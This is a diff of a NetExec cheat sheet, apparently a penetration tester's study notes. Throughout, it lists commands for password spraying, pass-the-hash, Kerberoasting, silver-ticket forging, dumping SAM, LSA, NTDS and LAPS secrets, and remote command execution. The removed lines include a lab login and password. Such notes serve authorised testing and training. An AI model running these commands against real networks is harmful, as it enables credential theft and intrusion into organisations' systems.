@@ -1,56 +1,49 @@
 https://www.netexec.wiki
 
-Note: Pwn3d! means code exec and RDP possible.
-
-Spraying
-	if you have a user list, always try spraying the list on both users and passwords.
+NOTE: Pwn3d! means code exec and RDP possible.
 ## General Usage
-NOTE: sometimes you HAVE to use kerberos (-k) to authenticate. This does not necessarily require a .ccache/.kirbi file.
 
 ```bash
-#Collect creds as you enumerate a network and reuse them
+# NETEXEC CHEATSHEET | <T>=Target <D>=Domain <U>=User <P>=Pass <H>=Hash <S>=SID
+# === AUTH & SPRAY ================================================================
+nxc smb <T> -u <U> -p <P> --pass-pol                   # Check pass policy first
+nxc smb <T> -u usr.txt -p pw.txt --continue-on-success # Spray combos
+nxc smb <T> -u <U> -H <H> --local-auth                 # PtH against local
+nxc smb <T> -u usr.txt -p <P> --no-bruteforce          # 1 try/user (no lockouts)
 
-# Spray domain users
-nxc smb <target> -d domain -u users -H hashes --continue-on-success [-k]
-nxc smb <target> -d domain -u users -p passwords --continue-on-success [-k]
+-d <domain>  # specify domain for domain auth
 
-# Spray for local users
-nxc smb <target> -U users -P passwords --continue-on-success --local-auth
-nxc smb <target> -U users -H hashes --continue-on-success --local-auth
+# === KERBEROS & TICKETS ==========================================================
+-k, --kerberos # Use Kerberos auth
+--use-kcache   # Use Kerberos authentication from ccache file 
 
-# Generate TGT!!!
-nxc smb <target> -d domain -u user -p pass -k --generate-tgt <Username>
-KRB5CCNAME=<Username>.ccache    # Set as env variable
-smbclient.py -k <FQDN>          # Auth example
+nxc ldap <T> -u <U> -p <P> --asreproast asrep.txt      # Harvest TGTs (No preauth)
+nxc ldap <T> -u <U> -p <P> --kerberoasting tgs.txt     # Harvest TGSs (Svc accts)
+nxc smb <T> -u <U> -p <P> --generate-tgt <U>           # Req TGT -> <U>.ccache
+getST.py -spn cifs/<T> <D>/<U>:<P>                     # Constrained Deleg TGS
+# Forge Silver Ticket (Requires target service account NT hash)
+ticketer.py -nthash <H> -domain-sid <S> -domain <D> -spn cifs/<T> Administrator
+export KRB5CCNAME=t.ccache; nxc smb <T> --use-kcache   # Pass-the-Ticket (PtT)
 
-	# Alternative: 
-	 getTGT.py -dc-ip <ip> 'domain/user:pass'
+# === ENUM & SECRETS ==============================================================
+nxc ldap <T> -u <U> -p <P> --users --groups            # Users and Groups
+nxc smb <T> -u <U> -p <P> --rid-brute                  # RID Cycling
+nxc smb <T> -u <U> -p <P> --shares                     # Shares
+nxc smb <T> -u <U> -p <P> -M webdav                    # Webdav
+nxc ldap <T> -u <U> -p <P> --trusted-for-delegation    # Unconstrained deleg
+nxc ldap <T> -u <U> -p <P> -M maq                      # MachineAccountQuota
+nxc ldap <T> -u <U> -p <P> -M adcs                     # AD Certificate Services
+nxc ldap <T> -u <U> -p <P> -M bloodhound -o COLLECTION_METHOD=All # BloodHound
+nxc smb <T> -u <U> -p <P> --sam                        # Dump SAM hashes
+nxc smb <T> -u <U> -p <P> --lsa                        # Dump LSA secrets
+nxc smb <T> -u <U> -p <P> --ntds                       # Dump NTDS.dit (DC)
+nxc ldap <T> -u <U> -p <P> -M laps                     # Read LAPS passwords
 
-# Spray subnet for user !!!
-nxc smb 10.10.10.0/24 -u bob -p password123
-
-# List Share
-netexec smb 172.16.191.11 -u joe -d medtech.com -p "Flowers1" --shares
-
-# List User info
---users # not always everyone...
-
-# dont brute force -- 1 user and 1 pass per file (see user-pass combos section)
---no-bruteforce
-
-# List pass-pol
---pass-pol # Useful for pass resets (See troubleshooting)
-
-# Dump Creds
---sam
---las
---ntds
-
-# Command execution
--x <command>
-
-# Dump all readable files from smb share
-nxc smb <stuff> -M spider_plus -o DOWNLOAD_FLAG=True
+# === EXECUTION ===================================================================
+nxc smb <T> -u <U> -p <P> -x "cmd"                     # CMD exec (wmiexec)
+nxc winrm <T> -u <U> -p <P> -X "ps1"                   # PS exec via WinRM
+nxc mssql <T> -u <U> -p <P> -M mssql_priv -x "cmd"     # MSSQL xp_cmdshell
+nxc mssql <T> -u <U> -p <P> -M spider_plus -o DOWNLOAD_FLAG=True# Spider + Download
 ```
 
 Spraying with user-pass combos
